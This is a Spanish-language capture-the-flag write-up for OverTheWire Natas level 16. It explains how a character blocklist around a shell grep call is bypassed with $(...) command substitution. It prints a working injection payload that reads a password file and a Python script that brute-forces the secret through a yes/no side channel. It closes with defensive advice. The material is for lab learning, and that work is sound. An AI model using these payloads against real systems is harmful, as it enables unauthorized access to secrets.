# Natas Level 16 → Level 17

> ⚠️ Spoilers: las contraseñas están omitidas (`[redacted]`). Lo importante es el método.

- **URL:** `http://natas16.natas.labs.overthewire.org`
- **Credenciales:** `natas16` / `[redacted]`

## Análisis y Explotación
Mismo buscador de palabras que natas9/natas10, pero con el filtro de caracteres más estricto de la serie. El código mete el input **dentro de comillas dobles**:

```php
if(preg_match('/[;|&`\'\"]/',$key)) {
    print "Input contains an illegal character!";
} else {
    passthru("grep -i \"$key\" dictionary.txt");
}
```

El filtro bloquea `;` `|` `&` `` ` `` `'` y `"`. Ya no se puede cerrar la comilla ni encadenar comandos como en natas10.

### El vector: command substitution con `$(...)`

Dentro de comillas dobles en bash, casi todo es texto literal **menos tres cosas** que conservan poder especial: `$`, `` ` `` y `\`. El backtick está bloqueado, pero `$` **no**. Eso habilita *command substitution*: `$(comando)` se ejecuta y su salida se inserta en el patrón que recibe `grep`.

Como el output de ese `grep` interno no se muestra directamente, se usa la misma lógica booleana que en natas15: deducir la password carácter por carácter según una respuesta de sí/no.

### El truco del sí/no

Se elige una palabra que **sí existe** en el diccionario (p. ej. `African`) y se le concatena un `$(grep ...)` que busca el prefijo candidato de la password de natas17:

```
African$(grep -E ^a /etc/natas_webpass/natas17)
```

La query en el servidor queda:
```bash
grep -i "African$(grep -E ^a /etc/natas_webpass/natas17)" dictionary.txt
```

- Si la password de natas17 **empieza con `a`** → el grep interno devuelve la password → el patrón se vuelve `African<password>` → no existe esa palabra → **`African` desaparece del output**
- Si **no** → el grep interno devuelve vacío → el patrón queda solo `African` → **`African` sí aparece**

La lógica se invierte respecto a lo intuitivo: **que `African` desaparezca = letra correcta.**

### Automatización con Python

Probar 62 caracteres × 32 posiciones a mano es inviable. El script arma el payload, lo manda al campo `needle` vía POST (con la autenticación HTTP básica), y revisa si `African` sigue en la respuesta:

```python
import requests, string

URL  = "http://natas16.natas.labs.overthewire.org/"
USER = "natas16"
PASS = "[redacted]"

charset = string.ascii_letters + string.digits
password = ""

print("[*] Extrayendo password de natas17...")
while True:
    found = False
    for c in charset:
        guess = password + c
        needle = f"African$(grep -E ^{guess} /etc/natas_webpass/natas17)"
        r = requests.post(URL, auth=(USER, PASS), data={"needle": needle})
        if "African" not in r.text:   # African desapareció → letra correcta
            password += c
            found = True
            print(f"[+] {password}")
            break
    if not found:
        break

print(f"[*] Password natas17: {password}")
```

Desglose de la petición clave:
- `requests.post(URL, ...)` → envía el formulario sin navegador, hablando directo con el servidor
- `auth=(USER, PASS)` → pasa la autenticación HTTP básica de natas automáticamente
- `data={"needle": needle}` → llena el campo del formulario (`name=needle`) con el payload
- `r.text` → el HTML de respuesta, donde se chequea si `African` aparece o no

El script reconstruye los 32 caracteres en orden, probando `a-z`, `A-Z`, `0-9` en cada posición.

- **Password obtenida (`natas17`):** `[redacted]`

## Lección aprendida
Una *blocklist* de caracteres nunca es suficiente: aunque natas16 filtra comillas, backticks y separadores, olvida que `$(...)` sigue vivo dentro de comillas dobles. Igual que en natas10, la defensa correcta es `escapeshellarg()` sobre el input o, mejor aún, no pasar jamás entrada de usuario a un shell: usar APIs que no invoquen `/bin/sh` (p. ej. buscar en el diccionario desde el propio PHP). Y aun sin ver el output del comando, un canal booleano (aparece/no aparece) basta para exfiltrar un secreto completo.
